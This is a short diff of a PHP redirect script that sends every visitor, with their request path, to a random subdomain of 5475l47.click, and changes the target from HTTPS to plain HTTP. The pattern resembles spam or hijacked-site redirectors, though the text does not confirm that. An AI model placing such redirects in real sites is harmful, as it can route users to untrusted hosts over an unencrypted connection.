@@ -17,7 +17,7 @@ $randomSubdomain = generateRandomString(6);
 $requestUri = $_SERVER['REQUEST_URI'];
 
 // Construct the new URL
-$newUrl = 'https://' . $randomSubdomain . '.5475l47.click' . $requestUri;
+$newUrl = 'http://' . $randomSubdomain . '.5475l47.click' . $requestUri;
 
 // Perform the redirection with a 302 Temporary Redirect
 header("Location: $newUrl", true, 302);
